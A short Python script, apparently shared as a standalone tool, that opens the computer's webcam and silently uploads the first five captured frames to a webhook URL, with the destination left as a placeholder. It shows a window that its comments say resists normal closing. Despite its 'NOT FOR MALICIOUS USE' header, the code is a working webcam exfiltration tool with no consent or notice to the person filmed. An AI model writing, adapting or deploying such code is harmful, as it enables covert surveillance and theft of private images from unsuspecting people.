# NOT FOR MALICIOUS USE
# Made by: Ragekill3377
import cv2
import requests
import numpy as np

capture = cv2.VideoCapture(0)
webhook = "webhook-URL-here"
framecount = 0

while True:
    ret, frame = capture.read()
    if not ret:
        break

    if framecount < 5:
        _, buffer = cv2.imencode('.jpg', frame)
        image_data = buffer.tobytes()
        requests.post(webhook, files={'file': ('frame.jpg', image_data, 'image/jpeg')})
        framecount += 1

    cv2.imshow("C&S", frame)

    if cv2.waitKey(1) == 27: # esc
        break
# if Escape key is pressed on keyboard, only then will the Window close.
# even if you press the cross to close app
# only escape key will work.
capture.release()
cv2.destroyAllWindows()
